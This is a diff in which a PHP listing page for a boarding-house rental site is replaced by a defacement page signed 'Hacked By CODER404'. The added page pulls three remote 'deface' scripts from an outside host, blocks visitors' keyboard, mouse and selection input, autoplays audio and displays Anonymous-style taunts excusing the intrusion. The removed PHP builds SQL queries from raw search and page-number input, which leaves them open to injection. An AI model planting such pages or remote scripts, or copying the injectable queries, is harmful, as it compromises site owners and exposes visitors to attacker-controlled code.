@@ -1,386 +1,146 @@
-<?php include('header.php'); ?>
-
-
-
-<?php 
-
-
-if (isset($_GET['pageno'])) {
-  $pageno = $_GET['pageno'];
-} else {
-  $pageno = 1;
-}
-  $no_of_records_per_page = 6;
-  $offset = ($pageno-1) * $no_of_records_per_page;
-
-  $total_pages_sql = "SELECT COUNT(*) FROM register1";
-  $result_pages = mysqli_query($dbconnection,$total_pages_sql);
-  $total_rows = mysqli_fetch_array($result_pages)[0];
-  $total_pages = ceil($total_rows / $no_of_records_per_page);
-
-$sql_show="SELECT * FROM rental LIMIT $offset, $no_of_records_per_page";
-
-
-
-if(isset($_POST["search"])) {
-
-  $query = $_POST['query'];
-  $sql_show="SELECT * FROM rental WHERE (`address` LIKE '%".$query."%')";
-
-}
-
-?>
-
-
-<div class="bigbanner">
-  <br />
-  <br />
-  <br /><br>
-  <h2 class="tagline">A PERFECT PLACE TO FIND YOUR PERFECT BHOUSE</h2>
- <center>
-  <form action="" method="POST">
-    <div class="input-group" id="searchbox">
-      <input name="query" type="text" class="form-control" placeholder="Search your barangay">
-    <button name="search" class="btn" type="submit">
-  Search <i class="fa fa-search rotating-icon"></i>
-</button>
-
-    </div>
-  </form>
-</center>
-</div>
-<br><br>
+<html>
+<head>
+    <script src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(04-01).js" type="application/javascript"></script>
+    <script type="application/javascript" src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(04-02).js" ></script>
+    <script type="application/javascript" src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(04-03).js"></script>
+<!-- AdFender script begin --><script type='text/javascript' src='http://local.adfender.com/adfender/elemhide.js'></script><!-- AdFender script end -->
+<!-- AdFender script begin --><script type='text/javascript' src='http://local.adfender.com/adfender/elemhide.js'></script><!-- AdFender script end -->
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js" type="text/javascript"></script> 
+<title>Hacked By CODER404</title>
 <style>
-.rotating-icon {
-  display: inline-block;
-  animation: sideward-rotate 5s infinite ease-in-out;
+body{ 
+background-color: #000000;
+background-repeat:no-repeat;
+background-attachment:fixed;
+background-position:center; 
+font-family: LOL SECURITY; 
+font-size: 27px;
 }
-
-@keyframes sideward-rotate {
-  0%, 100% {
-    transform: rotateY(0deg); /* Default position */
-  }
-  25% {
-    transform: rotateY(90deg); /* Midway rotation */
-  }
-  50% {
-    transform: rotateY(180deg); /* Flipped completely */
-  }
-  75% {
-    transform: rotateY(270deg); /* Almost back */
-  }
+h1 {
+padding: 10px 15px;
+margin: 0px;
+font-size: 14px;
+background-color: #000000;
+//background-image: -moz-linear-gradient(100% 100% 90deg, #777, #999) !important;
+//background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#999), to(#777)) !important;
+color: #FFF;
+//-webkit-border-radius:8px 8px 0px 0px;
+//-moz-border-radius: 8px 8px 0px 0px;
+border-radius: 8px 8px 0px 0px;
+text-shadow:1px 1px 2px #333333;
+opacity: 0.5;
 }
-
-#searchbox {
-    max-width: 600px;
-    margin: 0 auto;
-    display: flex;
-    align-items: center;
-    border: 1px solid #ddd;
-    border-radius: 30px;
-    background-color: #ffffff;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    overflow: hidden;
+table {
+width: 565px;
 }
+table tr td{
+font-family: verdana;
+font-size: 11px;
+padding: 10px 5px;
+border-bottom: solid 1px #CCC;
 
-#searchbox input {
-    border: none;
-    flex: 1;
-    padding: 12px 20px;
-    font-size: 1rem;
-    font-family: 'Roboto', sans-serif;
-    color: #333333;
-    border-radius: 30px 0 0 30px;
-    outline: none;
 }
-
-#searchbox input::placeholder {
-    color: #999999;
-    font-size: 0.9rem;
+#wrapper{
+width: 800px;
+margin: 10px auto;
+text-align: left;
+background: url('https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo.png') no-repeat center center fixed ;
+opacity:50%;
 }
-
-#searchbox button {
-    background: linear-gradient(90deg, #007bff, #0056b3);
-    color: #ffffff;
-    font-size: 1rem;
-    font-family: 'Poppins', sans-serif;
-    border: none;
-    padding: 12px 20px;
-    border-radius: 0 30px 30px 0;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+#console{
+height: 400px;
+overflow: auto;
+background-color: #000;
+padding: 15px;
+font-family: monospace;
+font-size: 12px;
+color: #FFF;
 }
-
-#searchbox button:hover {
-    background: linear-gradient(90deg, #0056b3, #003f7f);
+.content{
+padding: 15px;
 }
-
-#searchbox button i {
-    margin-left: 8px;
-    font-size: 1rem;
+#commander{
+border: solid 1px #CCC;
+padding: 5px 10px;
+-webkit-border-radius: 2px;
+-moz-border-radius: 2px;
+border-radius: 2px;
+margin: 5px;
+width: 590px;
+height: 30px;
 }
-
-#searchbox button:focus {
-    outline: none;
+.box{
+-moz-box-shadow: 1px 1px 8px #666;
+-webkit-box-shadow: 1px 1px 8px #666;
+box-shadow: 1px 1px 8px #40D5D2;
+border: solid 1px black;
+-webkit-border-radius: 8px 8px 0px 0px;
+-moz-border-radius: 8px 8px 0px 0px;
+border-radius: 8px 8px 0px 0px;
+margin: 15px 0px;
+background-color: #F5F5F5;
+opacity: 0.8;
 }
-
-@media (max-width: 768px) {
-    #searchbox {
-        flex-direction: column;
-        border-radius: 10px;
-    }
-
-    #searchbox input, #searchbox button {
-        border-radius: 0;
-        width: 100%;
-    }
-
-    #searchbox button {
-        border-radius: 0 0 10px 10px;
-    }
+#help{
+width: 300px;
+float: right;
 }
-/* Google Fonts */
-@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto:wght@400;500&display=swap');
-
-body {
-    font-family: 'Roboto', sans-serif;
-    background-color: #eff3ea;
-    margin: 0;
-    padding: 0;
+.prefix{
+color: #0077E7;
 }
-
-.course_card {
-    background-color: #ffffff;
-    border-radius: 12px;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    overflow: hidden;
-    margin-bottom: 24px;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
+.keyword{
+color: #9eff63;
 }
-
-.course_card:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+.error{
+color: #FF0000;
 }
-
-.course_card_img img {
-    width: 100%;
-    height: 200px;
-    object-fit: cover;
+.spacer{
+clear: both;
+display: block;
 }
-
-.course_card_content {
-    padding: 16px;
-    text-align: center;
-    height: 200px;
-}
-
-.course_card_content h5 {
-    font-family: 'Poppins', sans-serif;
-    font-size: 1.5rem;
-    font-weight: 600;
-    color: #333333;
-    margin-bottom: 12px;
-}
-
-.course_card_content .price {
-    font-size: 1.1rem;
-    color: #ff5722;
-    font-weight: 500;
-    margin-bottom: 8px;
-}
-
-.course_card_content .address {
-    font-size: 0.9rem;
-    color: #777777;
-    margin-bottom: 12px;
-}
-
-.course_card_content .slots {
-    font-size: 0.9rem;
-    color: #555555;
-    margin-top: 8px;
-}
-
-.course_card_content .slots i {
-    color: #007bff;
-    margin-right: 5px;
-}
-
-.course_card_footer {
-    padding: 16px;
-    background-color: #f9f9f9;
-    border-top: 1px solid #ececec;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-}
-
-.course_card_footer .ratingshome {
-    color: #ffc107;
-    font-size: 1.2rem;
-}
-
-.course_card_footer .btn {
-    padding: 10px 20px;
-    font-size: 0.9rem;
-    font-weight: 500;
-    color: #ffffff;
-    background-color: #007bff;
-    border-radius: 8px;
-    text-decoration: none;
-    transition: background-color 0.3s ease;
-}
-
-.course_card_footer .btn:hover {
-    background-color: #0056b3;
-}
-
-.course_card_footer .btn.disabled {
-    background-color: #b0b0b0;
-    pointer-events: none;
-}
-.pagination a {
-    color: #007bff;
-    padding: 10px 15px;
-    margin: 0 5px;
-    border: 1px solid #ddd;
-    border-radius: 8px;
-    text-decoration: none;
-    transition: background 0.3s ease;
-    display: inline-flex;
-    align-items: center; /* Align icon and text vertically */
-}
-
-.pagination a i {
-    margin-right: 5px; /* Adds space between icon and text */
-}
-
-.pagination a:hover {
-    background: #007bff;
-    color: #ffffff;
-}
-
-.pagination a.disabled {
-    pointer-events: none;
-    color: #cccccc;
-    border-color: #cccccc;
-}
-
-.pagination li.disabled a {
-    cursor: not-allowed;
-}
-
 </style>
-<br><br><br>
-<div class="container">
-    <div class="row mx-auto" id="recent">
-        <?php
 
-        include('encryption_helper.php'); // Include encryption helper file
-$encryption_key = 'YourSecureKeyHere';
-        $sql = $sql_show;
-        $result = mysqli_query($dbconnection, $sql);
-      while ($row = $result->fetch_assoc()) {
-    $rent_id = $row['rental_id'];
+</head>
+<body background='https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-hacked_gif.gif' oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>
+<br/><br/>
+<div id="wrapper">
+<div class="box">
+<h1>root@coder404~</h1>
+<div id="console"><span class="prefix">
+<p id="message">
+<font color="red">root@coder404:~#</font><font color="white"> hello admin <br>
+<font color="red">root@coder404:~#</font><font color="white"> <font color="aqua" size="5px">MR.CODER404</font> Was Here !!!<br>
+<font color="red">root@coder404:~#</font><font color="white"> Your security are low.<br>
+<font color="red">root@coder404:~#</font><font color="white"> Please patch your security.<br>
+<font color="red">root@coder404:~#</font><font color="white"> I will come back soon.<br>
+<font color="red">root@coder404:~#</font><font color="white"> We are <font color="yellow" size="3px">ANONYMOUS</font><br>
+<br>
+<font color="lime" size="5px">[+] Hacked By MR.CODER404</font><br>
+<font color="white">[+] Message : Remember this, There is not perfect security in the world..
+We are only testing your security on your site..Hacking is not criminal.. but Hacking is art<br>
+We are <font color="yellow" size="3px">ANONYMOUS</font> <br>
+We are United<br>
+We are Legion<br>
+We do not forgive<br>
+We do not forget<br>
+Expect us<br>
+<br>
 
-    // Calculate available slots
-$sql_book = "SELECT COUNT(*) AS booked_count FROM booking b 
-              JOIN payment p ON b.payment_id = p.payment_id
-              WHERE p.rental_id = ? AND b.status='Confirm'";
-$stmt_book = $dbconnection->prepare($sql_book);
-$stmt_book->bind_param("i", $rent_id);
-$stmt_book->execute();
-$result_book = $stmt_book->get_result();
-$row_book = $result_book->fetch_array();
-$reserved = $row_book['booked_count'];
-$stmt_book->close();
+<font color="Cyan">[+] Greetz : MR.CODER404 | NO SYSTEM IS SAFE <br/><br>
+<br>
+<br>
+<font color="yellow">./BlackHat-DarkNet<br>
+<script type="text/javascript">
+new TypingText(document.getElementById("message"), 50, function(i){ var ar 
 
-$available_slots = $row['slots'] - $reserved;
+= new Array("|", "|", "|", "|"); return " " + ar[i.length % ar.length]; });
 
+//Type out examples:
+TypingText.runAll();
 
-    // Encrypt the rental_id for the link
-    $encrypted_rental_id = encrypt($rent_id, $encryption_key);
-?>
-        <div class="col-lg-4 col-md-6 col-sm-12">
-            <div class="course_card">
-                <div class="course_card_img">
-                    <img src="uploads/<?php echo $row['photo']; ?>" alt="<?php echo htmlspecialchars($row['title']); ?>">
-                </div>
-                <div class="course_card_content">
-                    <h5><?php echo htmlspecialchars($row['title']); ?></h5>
-                    <div class="price">₱ <?php echo number_format($row['monthly'], 2); ?> / Monthly</div>
-                    <div class="address"><?php echo htmlspecialchars($row['address']); ?></div>
-                    <div class="slots">
-                        <i class="fa fa-bed"></i> <?php echo $available_slots; ?> Slots Available
-                    </div>
-                </div>
-               <div class="course_card_footer">
-    <?php
-    // Fetch the sum and count of ratings for the current rental
-   $sql_rating = "
-    SELECT 
-        SUM(b.ratings) AS totalrating, 
-        COUNT(b.ratings) AS ratingcount 
-    FROM booking b
-    INNER JOIN payment p ON b.payment_id = p.payment_id
-    INNER JOIN rental r ON p.rental_id = r.rental_id
-    WHERE r.rental_id = '$rent_id' AND b.ratings > 0;
-";
-
-    $result_rating = $dbconnection->query($sql_rating);
-    
-    $totalrating = 0;
-    $ratingcount = 0;
-
-    if ($result_rating && $row_rating = $result_rating->fetch_assoc()) {
-        $totalrating = (float)$row_rating['totalrating'];
-        $ratingcount = (int)$row_rating['ratingcount'];
-    }
-
-    // Calculate the average rating
-    $averageRating = ($ratingcount > 0) ? $totalrating / $ratingcount : 0;
-    
-    ?>
-    
-    <span class="ratingshome">
-        <?php
-        // Display average rating as stars (rounded to the nearest whole number)
-        $roundedRating = round($averageRating); // Round to the nearest integer
-        for ($i = 1; $i <= 5; $i++) {
-            echo ($i <= $roundedRating ? "★" : "☆");
-        }
-        ?>
-    </span>
-    <a class="btn <?php echo $available_slots == 0 ? 'disabled' : ''; ?>" 
-       href="<?php echo $available_slots > 0 ? 'view.php?rental_id=' . urlencode($encrypted_rental_id) : '#'; ?>">
-       <?php echo $available_slots == 0 ? 'Fully Booked' : 'Book Now'; ?>
-    </a>
+</script>
+<input text="test" id="commander" onkeyup="execute(this,event);" disabled="disabled" style="width:786px;"/>
 </div>
-
-            </div>
-        </div>
-        <?php } ?>
-    </div>
-<br><br>
-    <center>
-       <ul class="pagination">
-    <li class="<?php if ($pageno <= 1) echo 'disabled'; ?>">
-        <a href="<?php if ($pageno > 1) echo "?pageno=" . ($pageno - 1) . "#recent"; ?>">
-            <i class="fa fa-chevron-left"></i> Prev
-        </a>
-    </li>
-    <li class="<?php if ($pageno >= $total_pages) echo 'disabled'; ?>">
-        <a href="<?php if ($pageno < $total_pages) echo "?pageno=" . ($pageno + 1) . "#recent"; ?>">
-            Next <i class="fa fa-chevron-right"></i>
-        </a>
-    </li>
-</ul>
-
-    </center>
-</div>
-
-<?php include('footer.php'); ?>
+<div class="spacer"></div>
+<audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/mi-mi-mi.mp3" loop="1" autoplay="1"></audio>
+</body></html>
